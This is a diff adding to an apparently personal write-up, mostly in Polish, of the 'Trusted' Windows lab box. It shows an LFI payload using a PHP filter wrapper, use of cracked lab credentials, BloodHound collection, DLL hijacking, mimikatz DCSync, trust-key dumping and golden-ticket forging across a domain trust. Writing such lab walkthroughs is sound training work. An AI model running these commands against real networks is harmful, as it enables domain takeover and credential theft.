@@ -1,6 +1,8 @@
 # Trusted
 Windows, Easy, created by **r0BIT**
 
+![trusted_slide](https://github.com/user-attachments/assets/4eb8268d-451f-4107-bbe6-4e02f563df51)
+
 
 ```
 Nmap scan report for 10.10.229.149
@@ -432,5 +434,191 @@ Scanning: http://10.10.229.150/dashboard/ru/
 
 W sumie jedyne co wygląda ciekawie to `/dev/*`
 
+![{53B08835-4B6C-4262-B5A2-E1F74D2E5F7E}](https://github.com/user-attachments/assets/a184d907-8150-4924-98a6-248df278c75b)
+
+- xampp? :O
+
+![{B1FBA6A1-D86D-497B-9D80-A872B1D7FC33}](https://github.com/user-attachments/assets/2988f371-14c2-4f9f-9401-255a5775c6d2)
+
+O it looks interesting
+
+Yes.. LFI
+
+![{27F31FDF-E202-40CA-A27E-A60DD99E0DC7}](https://github.com/user-attachments/assets/85a38bee-fe39-4a29-89db-921e8db96c1f)
+
+![{3AC6E752-9FC9-437D-81C2-F6CD47FBBAB3}](https://github.com/user-attachments/assets/9f13a78a-14e5-434f-94e1-01a39fd2e986)
+
+![{3A8F02C7-949C-4875-B80B-218A65EFBC1F}](https://github.com/user-attachments/assets/b3fb2a24-8ba1-4f8a-a951-164b348f2f33)
+
+a to też ciekawe
+
+![{D32B8651-EDA6-4436-B3AD-2AADB4AB0C8E}](https://github.com/user-attachments/assets/faf40218-b393-4236-9b09-4218da508144)
+
+przy okazji wiemy, że to php także ładujemy wrappery i może przeczytamy coś "ukrytego" w tym kodzie. W teorii brzmi to jak nie realistyczy przypadek, ale programiści często wrzucają dziwne rzeczy do kodu, bo "i tak nikt nie zobaczy".
+
+![{DAD2BE04-6F22-461A-AA45-5BDAADC01E93}](https://github.com/user-attachments/assets/9dbe8886-be53-403e-804a-73c237f092a4)
+
+Działa.
+
+![{D60F46C8-4986-4FCB-867F-DC8872B1FBA4}](https://github.com/user-attachments/assets/f193aa31-0f24-463b-bd31-f179f1b91696)
+
+Błąd mówi nam gdzie jesteśmy.
+
+```
+http://10.10.249.150/dev/index.html?view=php://filter/convert.base64-encode/resource=file://C:\xampp\htdocs\dev\index.html
+```
+
+![{E704C825-4A73-47B2-A138-403EFB7BC986}](https://github.com/user-attachments/assets/56ae3382-5bb1-490d-98d1-5471c7c24edb)
+
+Po wykonaniu komendy na screeni dostajemy taki krótki fragment. Nic szczególnego, bo odkrytliśmy tą funkcjonalność moment temu.
+Czas poszukać jakiś plików z content discovery. `db.php` wygląda dobrze
+
+![{96189D78-77AC-40B1-AA2D-0063E505DFFD}](https://github.com/user-attachments/assets/f1a3fafc-0f19-4a0c-a7e5-b231effc348e)
+
+![{A0379DE1-2180-4337-BC37-DA5F4CE1A901}](https://github.com/user-attachments/assets/cf755789-aea4-4f35-b77f-a0fcfc67bc8d)
+
+Póki co tyle. Wracam jak coś fajnego będzie.
+
+![{7E73F89C-DC67-4258-A845-35F9399FD383}](https://github.com/user-attachments/assets/5a91f0ea-1b17-41cb-ae27-0dec82d99bd1)
+
+dobra to news było.
+- jedno się złamało.
+
+```
+nxc smb 10.10.249.150 -u rsmith -p <dasz radę sam zrobić> 
+```
+- zero ciakawych sharów więc certipy/bloodhound
+
+z jakiegoś powodu nie mogłem zrobić bloodhounda, ale rozwiązałem to tak
+```
+dnschef --fakeip 10.10.249.150
+bloodhound-python -d 'LAB.TRUSTED.VL' -u 'rsmith' -p 'IHateEric2' -ns 127.0.0.1 -dc labdc.LAB.TRUSTED.VL -c all
+```
+
+![{132FC492-B0AA-4617-91D1-019A58740353}](https://github.com/user-attachments/assets/b60823b2-ebdc-47b2-8947-7ed261ff1aa4)
+
+no to liniowo idziemy do EWALTERS
+
+![1](https://github.com/user-attachments/assets/515e5b04-338c-48ac-a744-33d689423581)
+
+jednakże widzimy, że ten user może PSRemote więc mamy wjazd na DCka z shellem w końcu.
+
+![{ECAF2216-8865-4C40-BECC-F75DA714055D}](https://github.com/user-attachments/assets/d1e0cd32-b02b-44c4-b3a0-33f25ceea61c)
+
+![{555FE816-F63E-42C7-A1ED-ABDB4A363123}](https://github.com/user-attachments/assets/6bef8f0b-5737-4ef7-895b-5e3ee4f0a502)
+
+![{9D624D70-354F-49CA-A100-4690BDEA2F83}](https://github.com/user-attachments/assets/1d61f888-a8fe-4dc0-a12d-b32e2c140139)
+
+![{1FAF21F4-FB34-49DD-AA2F-E4AA919F7BC5}](https://github.com/user-attachments/assets/625a39ae-49bc-41b2-b4c4-f86f694009f1)
+
+- wysłalem plik przez smb.
+
+![{EBD0F30B-9777-4598-82B0-4E5357084E0A}](https://github.com/user-attachments/assets/242ad2c7-e228-4f6a-a45b-d828dbdaf297)
+
+oooo ciekawy folder
+
+![{3E71819E-1BB9-4420-BA5A-C5E2DA3B96CB}](https://github.com/user-attachments/assets/ad335536-452b-40ce-8628-5297904c7ba6)
+
+![{15E4F041-F9EE-4E20-8D70-BC337B4D5DB2}](https://github.com/user-attachments/assets/0fd6cac2-d507-455f-8285-a458ba52f110)
+
+![{35B0CC79-C49B-4BCC-BFE4-36782F5E848F}](https://github.com/user-attachments/assets/87b6ffe9-dec7-4b2d-bc53-3550c2f18c95)
+
+![{06E46AB3-B8EA-40E6-B439-4A011E56B27B}](https://github.com/user-attachments/assets/4af5658a-079e-4d94-b3a1-8c2782f1e1aa)
+
+![{37A0F1DA-C596-456D-B722-424B91240BB0}](https://github.com/user-attachments/assets/851e080b-807d-495a-a5e7-e706a6c1c175)
+
+o szuka dllek w swojej ścieżce czyli możemy filtrować po `NAME NOT FOUND`
+
+![{158867F4-F5E6-4B5A-8474-E9DD958FCC63}](https://github.com/user-attachments/assets/4a87bc76-71e6-4a59-a391-c1f7076a8c6d)
+
+![{9807BACE-2D5C-4C80-BEC2-12E9B7FD8445}](https://github.com/user-attachments/assets/70800069-99ef-4e24-ad4d-f569428e574b)
+
+![{88C8F8FF-B7DF-4DCC-91BB-D49E3E7913E9}](https://github.com/user-attachments/assets/be489f38-0d10-4eee-81fa-6c44c4b10a49)
+
+![{4FBB59D1-BF07-441F-A5AC-4EDB6877F333}](https://github.com/user-attachments/assets/7a66aa6e-540b-4d94-a47b-3a9f7af5a180)
+
+- wrzuciłem i nic się nie dzieje. Możliwe, że coś przegapiłem :(
+
+![{FBBE6206-742A-4B5A-9A1F-AA6508D36B9B}](https://github.com/user-attachments/assets/b61ce740-ee94-4090-ade9-6586d0b23f48)
+
+dobra I AM BLIND i nie zauważyłem oczysitej dllki xd
+
+![{1969259D-616E-46A1-8705-339D0B5276ED}](https://github.com/user-attachments/assets/ff13968a-7677-4071-85bd-27f1fe75d4b1)
+
+![{144BED95-5342-4E07-A155-52163B972FC4}](https://github.com/user-attachments/assets/2e591245-7562-4c17-b950-656c6a0e49f5)
+
+Dobra eskalacja na milion sposobów xD
+
+![{CDDC604C-C854-4027-84DF-16BA82DA5930}](https://github.com/user-attachments/assets/7e4ca880-ef78-41f8-831d-ae671cd91329)
+
+albo.. nie muszę eskalować xD
+
+![{011F53D2-57EF-4A70-907B-591C6801A9D9}](https://github.com/user-attachments/assets/42425e5a-581b-499e-a783-89e9932f6a5e)
+
+![{5D939401-BD55-4493-8537-CACFA8DE8DE6}](https://github.com/user-attachments/assets/bd80b390-bebe-4ac6-8d6f-07c9be779426)
+
+dobra mamy DA w tej domenie.
+
+![{79F4A06D-35A5-4D19-8DFC-D8A42B2BC8FA}](https://github.com/user-attachments/assets/76602176-f4cf-44ff-b16c-a2da25653b93)
+
+trusty domenowe wygląda tak, ale to nie czytelne więc użyjemy trochę cmd
+```
+nltest.exe /trusted_domains
+```
+
+
+
+![{5FB00F25-5E32-4D09-A0BC-DE2DB6292860}](https://github.com/user-attachments/assets/2c68f242-fc2f-4708-be2e-653cb882c117)
+
+Fajnie rzucić tam mimikatza i zrobić to przez GUI (tak malo redteamowo, ale to nie redteam xd)
+```
+xfreerdp /v:10.10.249.150 /u:bartek /p:'password1!' /drive:mimikatz
+
+privilege::debug
+lsadump::dcsync /domain:lab.trusted.vl /all
+
+```
+
+![{F2F8855B-067C-4CE6-A69B-3A60AF826B55}](https://github.com/user-attachments/assets/55a1a58e-477c-40b9-9f86-0ac1f3d4761d)
+
+```
+lsadump::trust /patch
+```
+
+![{92AC41AF-8CBE-4E8F-BF6B-C28755C193B4}](https://github.com/user-attachments/assets/65ec95d9-48bb-4c5f-8978-368712aa69a5)
+
+```
+ kerberos::golden /user:Administrator /krbtgt:<haszyk>d /domain:lab.trusted.vl /sid:<SID> /sids:<SIDS> /ptt
+```
+
+![{1BF27525-577A-49D9-A2CD-07F338D94F5A}](https://github.com/user-attachments/assets/771ebb08-0d81-4d24-ae2a-f86978fe7ef7)
+
+```
+lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
+```
+
+![final](https://github.com/user-attachments/assets/d4606e9a-32c1-45f8-ab69-8ba1ce846600)
+
+![dwa](https://github.com/user-attachments/assets/82dd205c-e70e-4572-af29-4435c93d6650)
+
+![{B80C6FD0-8935-4939-B58C-C900BD0DA471}](https://github.com/user-attachments/assets/fb020f5f-535f-4f56-a94b-9c01debf5338)
+
+i tyle.
+
+albo nie :O
+
+![{AA7CAA66-0F8A-40D6-ABB7-3B53C8794EDD}](https://github.com/user-attachments/assets/70833120-0556-4e1f-9734-4ac423d242cb)
+
+![{7D6B121E-4865-44A3-9D1A-DC1DFC4B63BF}](https://github.com/user-attachments/assets/b121aead-5498-4b02-85e5-e5c485dc437c)
+
+password is cracable
+
+![{B983D97B-4142-4DE8-873B-8F7EDC460B24}](https://github.com/user-attachments/assets/cfd0f067-e0a9-4025-9899-e4c2c6ddff0f)
+
+I got root flag but I dont get user
+
+![{2058AE00-7421-404C-BD6D-6FC5D733033A}](https://github.com/user-attachments/assets/b5a45b09-ffd9-41b1-9b1f-6217c1d7a6a9)
+
+dobra mam usera
 
 
